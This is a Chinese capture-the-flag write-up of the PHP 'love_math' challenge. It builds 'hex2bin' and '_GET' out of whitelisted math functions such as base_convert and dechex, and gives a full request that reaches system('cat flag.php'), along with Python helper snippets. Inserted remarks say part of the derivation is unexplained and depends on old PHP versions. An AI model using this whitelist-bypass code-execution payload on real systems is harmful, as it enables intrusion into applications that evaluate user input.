ailx10说：这篇是我2025年1月写的。love\_math 给了一堆能用的数学和进制函数，看起来跟命令执行离得很远。我顺着白名单能生成什么字符串去试，先拼出 hex2bin，再构造 \_GET，让请求参数间接接上动态调用。最后提交时，结果末尾的空格还让我多绕了一下。这篇把这种一步步“造出名字”的过程留了下来，读起来有点像搭积木。它不只是一个神奇表达式，更重要的是每层表达式返回了什么、最后为什么会把一个字符串当成可调用的东西。

---

本文记录在受限函数条件下构造字符串并尝试动态调用的历史题目。

字符串 \_GET 与 PHP 超全局变量 $\_GET 不是同一个概念；需要结合完整求值上下文确认转换，花括号索引也依赖旧版 PHP。

难度系数：5（官方系数：8）

![](/notes-assets/5db60a7b11b5dd25cd31.webp)

给定了可以执行的白名单函数，比如计算`abs(-1)=1`

![](/notes-assets/29c03ece33971cb0a3e1.webp)

先看结论：基于给定的白名单函数，使用Burp Suite 构造请求，拿到flag

```
GET /?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($pi){0}(($pi){1})&0=system&1=cat+flag.php HTTP/1.1
```

![](/notes-assets/7fa2175bc3306d6264dd.webp)

分析前半段：

```
$pi=base_convert(37907361743,10,36)(dechex(1598506324));
```

- `base_convert(37907361743,10,36)`: 将 `37907361743` 从十进制转换为 36 进制，得到 hex2bin
- `dechex(1598506324)` ：将 `1598506324` 转换为十六进制，得到 5f474554

hex2bin 产生的是字符串 \_GET；这一步本身并不等同于获得超全局变量，后续如何求值需要核验完整代码。

分析后半段：

```
($pi){0}(($pi){1})&0=system&1=cat+flag.php
```

原文将字符串直接替换为 $\_GET 的推导缺少解释，不能仅凭此步骤认定其成立；请对照实际 PHP 表达式和运行版本验证。

带入`0=system`，`1=cat+flag.php`，可得`system(cat+flag.php)`

![](/notes-assets/b9467c9b055ff0fcc9d3.webp)

运算过程如下图所示：36进制完美覆盖26个英文字母和0-9十个数字

![](/notes-assets/58d746e8ce61dd09d615.webp)

做题的时候，需要逆向思考：

- 如何将36进制的`hex2bin`转化为10进制？

```
base36_string = "hex2bin"

decimal_value = int(base36_string, 36)

print(f"36进制: {base36_string}  对应的10进制: {decimal_value}")



## 36进制: hex2bin 对应的10进制: 37907361743
```

- 如何将字符串`_GET`转换为16进制的ASCII码？

```
string = "_GET"

# 将每个字符转换为对应的十六进制 ASCII 码

hex_values = [format(ord(c), 'x') for c in string]

hex_string = ''.join(hex_values)  # 将所有十六进制值合并为一个字符串

print(f"字符串 '{string}' 转换为十六进制 ASCII 码: {hex_string}")



## 字符串 '_GET' 转换为十六进制 ASCII 码: 5f474554
```

- 如何将16进制转换为10进制？

```
hex_string = "5f474554"

decimal_value = int(hex_string, 16)

print(f"16进制 '{hex_string}' 转换为10进制: {decimal_value}")



## 16进制 '5f474554' 转换为10进制: 1598506324
```

末尾空格带来的差异也值得保留，它说明输入格式本身仍在参与判断。解释清每段字符串如何生成，才有办法在另一个条件下重新构造，而不是只复制一次成功结果。
